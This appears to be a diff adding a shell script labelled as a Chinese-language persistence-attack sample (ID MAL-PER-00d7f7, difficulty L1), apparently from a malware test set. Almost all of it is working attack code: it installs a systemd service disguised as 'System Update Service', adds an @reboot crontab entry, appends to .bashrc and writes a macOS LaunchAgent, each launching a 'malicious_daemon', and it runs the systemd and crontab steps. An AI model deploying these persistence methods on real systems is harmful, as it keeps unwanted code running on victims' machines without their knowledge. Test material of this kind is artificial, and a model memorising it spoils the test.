@@ -1,0 +1,61 @@
+#!/bin/bash
+# MAL-PER-00d7f7 - 持久化攻击
+# 难度：L1 | 语言：Shell
+
+# 方案 1: systemd 服务
+create_systemd_service() {
+    cat > /etc/systemd/system/malicious.service << 'EOF'
+[Unit]
+Description=System Update Service
+After=network.target
+
+[Service]
+Type=simple
+ExecStart=/usr/local/bin/malicious_daemon
+Restart=always
+RestartSec=10
+
+[Install]
+WantedBy=multi-user.target
+EOF
+
+    systemctl daemon-reload
+    systemctl enable malicious.service
+    systemctl start malicious.service
+}
+
+# 方案 2: crontab
+add_crontab_entry() {
+    (crontab -l 2>/dev/null; echo "@reboot /usr/local/bin/malicious_daemon") | crontab -
+}
+
+# 方案 3: .bashrc 注入
+inject_bashrc() {
+    echo "/usr/local/bin/malicious_daemon &" >> ~/.bashrc
+}
+
+# 方案 4: launchd (macOS)
+create_launchd_job() {
+    cat > ~/Library/LaunchAgents/com.malicious.daemon.plist << 'EOF'
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <key>Label</key>
+    <string>com.malicious.daemon</string>
+    <key>ProgramArguments</key>
+    <array>
+        <string>/usr/local/bin/malicious_daemon</string>
+    </array>
+    <key>RunAtLoad</key>
+    <true/>
+</dict>
+</plist>
+EOF
+
+    launchctl load ~/Library/LaunchAgents/com.malicious.daemon.plist
+}
+
+# 执行
+create_systemd_service
+add_crontab_entry
